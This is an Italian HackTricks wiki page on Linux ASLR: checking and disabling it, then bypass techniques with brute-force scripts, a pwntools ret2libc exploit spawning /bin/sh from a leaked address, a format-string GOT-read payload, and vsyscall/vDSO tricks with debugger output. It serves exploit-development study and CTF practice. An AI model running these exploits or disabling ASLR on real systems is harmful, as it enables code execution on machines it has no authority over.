# ASLR

{% hint style="success" %}
Impara e pratica l'Hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.

</details>
{% endhint %}

## Informazioni di Base

**Address Space Layout Randomization (ASLR)** √® una tecnica di sicurezza utilizzata nei sistemi operativi per **randomizzare gli indirizzi di memoria** utilizzati dai processi di sistema e dalle applicazioni. In questo modo, rende significativamente pi√π difficile per un attaccante prevedere la posizione di processi e dati specifici, come lo stack, l'heap e le librerie, mitigando cos√¨ determinati tipi di exploit, in particolare gli overflow di buffer.

### **Verifica dello Stato di ASLR**

Per **verificare** lo stato di ASLR su un sistema Linux, √® possibile leggere il valore dal file **`/proc/sys/kernel/randomize_va_space`**. Il valore memorizzato in questo file determina il tipo di ASLR applicato:

* **0**: Nessuna randomizzazione. Tutto √® statico.
* **1**: Randomizzazione conservativa. Le librerie condivise, lo stack, mmap(), la pagina VDSO sono randomizzati.
* **2**: Randomizzazione completa. Oltre agli elementi randomizzati dalla randomizzazione conservativa, la memoria gestita tramite `brk()` √® randomizzata.

√à possibile verificare lo stato di ASLR con il seguente comando:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Disattivazione di ASLR**

Per **disattivare** ASLR, si imposta il valore di `/proc/sys/kernel/randomize_va_space` a **0**. Disattivare ASLR di solito non √® consigliato al di fuori di scenari di test o debug. Ecco come √® possibile disattivarlo:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Puoi anche disabilitare ASLR per un'esecuzione con:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Abilitazione di ASLR**

Per **abilitare** ASLR, √® possibile scrivere un valore di **2** nel file `/proc/sys/kernel/randomize_va_space`. Questo richiede tipicamente privilegi di root. Abilitare la piena randomizzazione pu√≤ essere fatto con il seguente comando:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenza attraverso i riavvii**

Le modifiche apportate con i comandi `echo` sono temporanee e verranno ripristinate al riavvio. Per rendere persistente la modifica, √® necessario modificare il file `/etc/sysctl.conf` e aggiungere o modificare la seguente riga:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Dopo aver modificato `/etc/sysctl.conf`, applica le modifiche con:
```bash
sudo sysctl -p
```
Questo assicurer√† che le impostazioni del ASLR rimangano attive anche dopo i riavvii.

## **Bypass**

### Forzatura a 32 bit

PaX divide lo spazio degli indirizzi del processo in **3 gruppi**:

* **Codice e dati** (inizializzati e non inizializzati): `.text`, `.data`, e `.bss` ‚Äî> **16 bit** di entropia nella variabile `delta_exec`. Questa variabile viene inizializzata casualmente ad ogni processo e aggiunta agli indirizzi iniziali.
* **Memoria** allocata da `mmap()` e **librerie condivise** ‚Äî> **16 bit**, chiamato `delta_mmap`.
* **Lo stack** ‚Äî> **24 bit**, indicato come `delta_stack`. Tuttavia, utilizza effettivamente **11 bit** (dal 10¬∞ al 20¬∞ byte incluso), allineati a **16 byte** ‚Äî> Ci√≤ porta a **524.288 possibili indirizzi reali dello stack**.

I dati precedenti sono per sistemi a 32 bit e la ridotta entropia finale rende possibile aggirare il ASLR riprovando l'esecuzione pi√π volte fino a quando l'exploit viene completato con successo.

#### Idee per la forzatura:

* Se si dispone di un overflow sufficientemente grande per ospitare un **ampio NOP sled prima del codice shell**, √® possibile forzare gli indirizzi nello stack fino a quando il flusso **salta una parte del NOP sled**.
* Un'altra opzione in questo caso, nel caso in cui l'overflow non sia cos√¨ grande e l'exploit possa essere eseguito in locale, √® possibile **aggiungere il NOP sled e il codice shell in una variabile di ambiente**.
* Se l'exploit √® locale, √® possibile tentare di forzare l'indirizzo di base di libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se stai attaccando un server remoto, potresti provare a **forzare l'indirizzo della funzione `usleep` della `libc`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

{% hint style="success" %}
Nei sistemi a 64 bit l'entropia √® molto pi√π alta e questo non dovrebbe essere possibile.
{% endhint %}

### Forzatura dello stack a 64 bit

√à possibile occupare una grande parte dello stack con variabili d'ambiente e poi provare ad abusare del binario centinaia/migliaia di volte in locale per sfruttarlo.\
Il codice seguente mostra come sia possibile **selezionare semplicemente un indirizzo nello stack** e ogni **centinaia di esecuzioni** quell'indirizzo conterr√† l'istruzione **NOP**:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### Informazioni Locali (`/proc/[pid]/stat`)

Il file **`/proc/[pid]/stat`** di un processo √® sempre leggibile da chiunque e **contiene informazioni interessanti** come:

* **startcode** & **endcode**: Indirizzi sopra e sotto con il **TESTO** del binario
* **startstack**: L'indirizzo di inizio dello **stack**
* **start\_data** & **end\_data**: Indirizzi sopra e sotto dove si trova il **BSS**
* **kstkesp** & **kstkeip**: Indirizzi correnti di **ESP** e **EIP**
* **arg\_start** & **arg\_end**: Indirizzi sopra e sotto dove si trovano gli **argomenti della riga di comando**
* **env\_start** & **env\_end**: Indirizzi sopra e sotto dove si trovano le **variabili d'ambiente**.

Pertanto, se l'attaccante si trova nello stesso computer del binario che viene sfruttato e questo binario non si aspetta l'overflow dagli argomenti grezzi, ma da un diverso **input che pu√≤ essere creato dopo aver letto questo file**. √à possibile per un attaccante **ottenere alcuni indirizzi da questo file e costruire offset da essi per lo sfruttamento**.

{% hint style="success" %}
Per ulteriori informazioni su questo file controlla [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) cercando `/proc/pid/stat`
{% endhint %}

### Avere una fuga

* **La sfida consiste nel fornire una fuga**

Se ti viene fornita una fuga (sfide CTF facili), puoi calcolare offset da essa (supponendo ad esempio di conoscere la versione esatta di libc utilizzata nel sistema che stai sfruttando). Questo exploit di esempio √® estratto dall'[**esempio da qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (controlla quella pagina per ulteriori dettagli):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Sfruttando un overflow del buffer sarebbe possibile sfruttare un **ret2plt** per estrarre un indirizzo di una funzione dalla libc. Controlla:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Proprio come in ret2plt, se si dispone di una lettura arbitraria tramite una vulnerabilit√† delle stringhe di formato, √® possibile estrarre l'indirizzo di una funzione della **libc** dal GOT. Il seguente [**esempio √® da qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Puoi trovare ulteriori informazioni sull'arbitrary read delle stringhe di formato in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Prova a eludere l'ASLR sfruttando gli indirizzi all'interno dello stack:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

Il meccanismo **`vsyscall`** serve per migliorare le prestazioni consentendo a determinate chiamate di sistema di essere eseguite nello spazio utente, anche se fanno fondamentalmente parte del kernel. Il vantaggio critico delle **vsyscalls** risiede nei loro **indirizzi fissi**, che non sono soggetti a **ASLR** (Randomizzazione della disposizione dello spazio degli indirizzi). Questa natura fissa significa che gli attaccanti non necessitano di una vulnerabilit√† di leak di informazioni per determinare i loro indirizzi e utilizzarli in un exploit.\
Tuttavia, non saranno trovati gadget super interessanti qui (anche se ad esempio √® possibile ottenere un equivalente di `ret;`)

(L'esempio e il codice seguenti sono [**tratti da questo writeup**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

Ad esempio, un attaccante potrebbe utilizzare l'indirizzo `0xffffffffff600800` all'interno di un exploit. Mentre tentare di saltare direttamente a un'istruzione `ret` potrebbe portare a instabilit√† o crash dopo l'esecuzione di un paio di gadget, saltare all'inizio di una `syscall` fornita dalla sezione **vsyscall** pu√≤ risultare vincente. Posizionando attentamente un gadget **ROP** che porta l'esecuzione a questo indirizzo **vsyscall**, un attaccante pu√≤ ottenere l'esecuzione del codice senza dover eludere **ASLR** per questa parte dell'exploit.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

Nota quindi come potrebbe essere possibile **bypassare ASLR abusando del vdso** se il kernel √® compilato con CONFIG\_COMPAT\_VDSO poich√© l'indirizzo vdso non verr√† randomizzato. Per ulteriori informazioni controlla:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}
